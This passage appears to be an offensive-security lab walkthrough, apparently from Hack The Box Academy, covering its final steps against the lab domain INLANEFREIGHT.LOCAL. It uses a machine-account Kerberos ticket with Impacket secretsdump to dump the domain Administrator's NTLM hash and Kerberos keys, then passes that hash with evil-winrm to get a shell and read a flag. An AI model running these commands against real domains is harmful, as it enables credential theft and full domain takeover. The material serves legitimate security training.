(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-horirkufg2]─[~]
└──╼ [★]$ klist
Ticket cache: FILE:/tmp/dc.ccache
Default principal: dc01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
06/11/2025 06:01:51  06/11/2025 16:01:51  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Using Impacket's `secretsdump` with the `-k` option for Kerberos authentication along with the `-no-pass` option to not prompt for a password, followed by the `DC` IP address:



```shell
impacket-secretsdump -k -no-pass -dc-ip STMIP -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```



```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.156.68 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
Administrator:des-cbc-md5:a1f262b50b64c46b
[*] Cleaning up...
```

Students will then use the Administrator's hash to perform a pass the hash attack using `evil-winrm` as follows:



```shell
evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```



```shell-session
(.venv) ┌─[eu-academy-1]─[10.10.14.209]─[htb-ac-569447@htb-vgqg5jqlz2]─[~]
└──╼ [★]$ evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Subsequently, students will obtain the flag by querying the contents of `flag.txt` located in the `C:\Users\Administrator\Desktop` directory:



```shell
type C:\Users\Administrator\Desktop\flag.txt
```



```shell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt

{hidden}
```

Answer: {hidden}